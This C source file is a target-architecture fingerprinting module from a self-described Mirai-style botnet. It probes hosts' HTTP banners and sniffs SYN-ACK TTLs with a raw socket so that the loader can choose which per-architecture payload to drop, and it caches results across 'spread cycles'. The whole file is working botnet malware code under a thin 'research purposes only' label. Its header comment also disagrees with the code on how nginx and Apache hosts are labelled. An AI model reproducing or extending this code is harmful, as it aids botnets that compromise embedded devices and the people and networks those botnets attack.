/*
 * notnet - Modern Mirai-Style Botnet
 * arch_detect.c - Target architecture fingerprinting (#160)
 *
 * Mirai-class loaders compile one binary PER architecture and must pick
 * the right one before dropping it. This module answers "what is the
 * target likely to be" from two passive signals:
 *
 *   HTTP header markers (dominant signal):
 *     - Boa / Realtek SDK httpd  -> MIPS (Realtek Jungle SDK, Boa-based
 *       vendor firmwares ship mips-linux-uclibc userlands)
 *     - uClinux-style banners    -> ARM9 ("uClinux", "ARM9", GoAhead
 *       builds advertising ARM eval boards)
 *     - Server: nginx / Apache   -> x86-class generic server; reported
 *       as UNKNOWN for kit-selection purposes (no embedded payload
 *       fits, modules still gate on their own probes)
 *
 *   TCP/IP initial TTL heuristic (tie-breaker / fallback):
 *     sniffed via a raw socket (SOCK_RAW/IPPROTO_TCP) while we complete
 *     our own TCP connect. Observed SYN-ACK TTL <65 -> MIPS-ish
 *     (initial TTL 64), <129 -> x86-class (initial TTL 128). Requires
 *     CAP_NET_RAW; fails soft to ARCH_UNKNOWN when unavailable.
 *
 * All sockets are bounded-timeout, all buffers sized, nothing is
 * executed on the target — this is fingerprinting only.
 *
 * Research purposes only.
 */
#include "arch_detect.h"
#include "config.h"
#include "util.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/select.h>

/* ── Result cache ─────────────────────────────────────────── */
/* Small fixed table keyed by dotted-quad IP. Linear scan is fine at
 * ARCH_CACHE_MAX entries; the cache exists so repeated spread cycles
 * against the same host do not re-probe. */
#define ARCH_CACHE_MAX 64

typedef struct {
    char ip[16];      /* dotted quad + NUL */
    char arch[16];    /* ARCH_* label */
    char src[12];     /* how we decided: header | ttl | none */
    int ttl;          /* observed TTL (-1 when not measured) */
} arch_cache_entry_t;

static arch_cache_entry_t arch_cache[ARCH_CACHE_MAX];
static int arch_cache_count = 0;

void arch_cache_reset(void) {
    arch_cache_count = 0;
}

static const arch_cache_entry_t *arch_cache_find(const char *ip) {
    for (int i = 0; i < arch_cache_count; i++)
        if (strcmp(arch_cache[i].ip, ip) == 0)
            return &arch_cache[i];
    return NULL;
}

static void arch_cache_store(const char *ip, const char *arch,
                             const char *src, int ttl) {
    if (arch_cache_count >= ARCH_CACHE_MAX) {
        /* Evict oldest (index 0) and shift — cache is tiny. */
        memmove(&arch_cache[0], &arch_cache[1],
                sizeof(arch_cache_entry_t) * (size_t)(ARCH_CACHE_MAX - 1));
        arch_cache_count = ARCH_CACHE_MAX - 1;
    }
    arch_cache_entry_t *e = &arch_cache[arch_cache_count++];
    snprintf(e->ip, sizeof(e->ip), "%.15s", ip);
    snprintf(e->arch, sizeof(e->arch), "%.15s", arch);
    snprintf(e->src, sizeof(e->src), "%.11s", src);
    e->ttl = ttl;
}

/* ── Signal 1: HTTP banner markers ────────────────────────── */

/* Send GET / and read the bounded response. Returns bytes read or -1.
 * Same shape as the CVE module exchange: raw sockets, hard timeout,
 * response NUL-terminated. */
static int arch_http_get(const char *ip, uint16_t port,
                         char *resp, size_t resp_len) {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) return -1;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { .tv_sec = SCAN_TIMEOUT_MS / 1000, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(sock);
        return -1;
    }

    char req[128];
    snprintf(req, sizeof(req), "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", ip);
    size_t req_len = strlen(req);
    if (send(sock, req, req_len, 0) != (ssize_t)req_len) {
        close(sock);
        return -1;
    }

    int total = 0;
    while (total < (int)resp_len - 1) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        tv.tv_sec = 2; tv.tv_usec = 0;
        if (select(sock + 1, &fds, NULL, NULL, &tv) <= 0) break;
        int n = recv(sock, resp + total, resp_len - 1 - total, 0);
        if (n <= 0) break;
        total += n;
    }
    resp[total] = '\0';
    close(sock);
    return total;
}

/* Case-insensitive substring over a bounded buffer. */
static int arch_contains_ci(const char *haystack, const char *needle) {
    size_t hlen = strlen(haystack), nlen = strlen(needle);
    if (nlen == 0 || nlen > hlen) return 0;
    for (size_t i = 0; i + nlen <= hlen; i++) {
        size_t j = 0;
        while (j < nlen) {
            char a = haystack[i + j], b = needle[j];
            if (a >= 'A' && a <= 'Z') a += (char)('a' - 'A');
            if (b >= 'A' && b <= 'Z') b += (char)('a' - 'A');
            if (a != b) break;
            j++;
        }
        if (j == nlen) return 1;
    }
    return 0;
}

/* Map banner text to an architecture label. Returns NULL when no
 * marker matched. Order matters: specific embedded markers first so a
 * Boa-on-x86 oddity cannot mask the common MIPS case. */
static const char *arch_from_banner(const char *resp) {
    /* Realtek Jungle SDK / Boa httpd -> MIPS family (big-endian
     * mips-linux-uclibc is the dominant firmware base). */
    if (arch_contains_ci(resp, "Boa/") ||
        arch_contains_ci(resp, "Boa httpd") ||
        arch_contains_ci(resp, "Realtek"))
        return ARCH_MIPS;
    /* uClinux-style banners -> ARM9 class (GoAhead/uClinux builds). */
    if (arch_contains_ci(resp, "uClinux") ||
        arch_contains_ci(resp, "ARM9") ||
        arch_contains_ci(resp, "ARMv5") ||
        arch_contains_ci(resp, "GoAhead"))
        return ARCH_ARM9;
    /* Generic server stacks: x86-class hosts. Not an embedded target,
     * so report UNKNOWN for payload selection. */
    if (arch_contains_ci(resp, "nginx") ||
        arch_contains_ci(resp, "Apache") ||
        arch_contains_ci(resp, "IIS") ||
        arch_contains_ci(resp, "lighttpd"))
        return ARCH_X86;
    return NULL;
}

/* ── Signal 2: TCP initial-TTL heuristic ──────────────────── */

/* Sniff the SYN-ACK of our own connect with a raw socket to read the
 * remote initial TTL. Returns the observed TTL (1..255), 0 when the
 * port did not answer, -1 when raw capture is unavailable/unpermitted.
 * Needs CAP_NET_RAW — unprivileged bots fail soft here. */
static int arch_probe_ttl(const char *ip, uint16_t port) {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) return -1;

    /* Raw listener FIRST, so no early SYN-ACK slips past us. Fails
     * immediately without CAP_NET_RAW (EACCES/EPERM). */
    int rawfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rawfd < 0) return -1;

    int tcpfd = socket(AF_INET, SOCK_STREAM, 0);
    if (tcpfd < 0) { close(rawfd); return -1; }

    /* Non-blocking connect: we poll both fds instead of blocking. */
    int flags = fcntl(tcpfd, F_GETFL, 0);
    fcntl(tcpfd, F_SETFL, flags | O_NONBLOCK);

    int ttl_seen = 0;
    connect(tcpfd, (struct sockaddr *)&sa, sizeof(sa)); /* EINPROGRESS ok */

    /* Bounded sniff window (~SCAN_TIMEOUT_MS): read raw IP packets and
     * keep the first TCP segment whose source matches the probe. The
     * kernel delivers received TCP as full IP datagrams on SOCK_RAW. */
    int deadline = SCAN_TIMEOUT_MS / 1000;
    if (deadline < 1) deadline = 1;
    for (int sec = 0; sec < deadline && ttl_seen == 0; sec++) {
        fd_set fds;
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        FD_ZERO(&fds);
        FD_SET(rawfd, &fds);
        if (select(rawfd + 1, &fds, NULL, NULL, &tv) <= 0) continue;
        unsigned char pkt[512];
        ssize_t n = recv(rawfd, pkt, sizeof(pkt), 0);
        if (n < (ssize_t)sizeof(struct iphdr)) continue;
        const struct iphdr *iph = (const struct iphdr *)pkt;
        if (iph->version != 4 || iph->protocol != IPPROTO_TCP) continue;
        if (iph->saddr != sa.sin_addr.s_addr) continue;
        /* Only count segments that look like handshake replies (SYN or
         * ACK set) so RSTs from closed ports do not poison the TTL. */
        size_t hlen = (size_t)(iph->ihl) * 4;
        if ((size_t)n < hlen + 14) continue;
        const struct tcphdr *th =
            (const struct tcphdr *)(pkt + hlen);
        uint8_t fl = th->syn | th->ack;
        if (!fl) continue;
        ttl_seen = iph->ttl;
    }
    close(tcpfd);
    close(rawfd);
    return ttl_seen ? ttl_seen : 0;
}

/* ── Public API ───────────────────────────────────────────── */

const char *arch_detect(const char *ip, uint16_t port,
                        char *out, size_t out_len) {
    if (!ip || !*ip) return ARCH_UNKNOWN;

    const arch_cache_entry_t *hit = arch_cache_find(ip);
    if (hit) {
        if (out && out_len > 0)
            snprintf(out, out_len, "%s ttl=%d src=cache", hit->arch, hit->ttl);
        return hit->arch;
    }

    const char *arch = ARCH_UNKNOWN;
    const char *src = "none";
    int ttl = -1;

    /* Signal 1: passive banner. */
    char resp[1024];
    int n = arch_http_get(ip, port, resp, sizeof(resp));
    if (n > 0) {
        const char *b = arch_from_banner(resp);
        if (b) { arch = b; src = "header"; }
    }

    /* Signal 2: TTL heuristic — used when the banner said nothing, and
     * logged alongside otherwise (<65 vs <129 initial-TTL classes). */
    int pttl = arch_probe_ttl(ip, port);
    if (pttl > 0) {
        ttl = pttl;
        if (strcmp(src, "header") != 0) {
            if (pttl < 65)      { arch = ARCH_MIPS; src = "ttl"; }
            else if (pttl < 129){ arch = ARCH_X86;  src = "ttl"; }
        }
    }

    arch_cache_store(ip, arch, src, ttl);
    log_debug("ARCH: %s -> %s (ttl=%d src=%s)", ip, arch, ttl, src);
    if (out && out_len > 0)
        snprintf(out, out_len, "%s ttl=%d src=%s", arch, ttl, src);
    return arch;
}
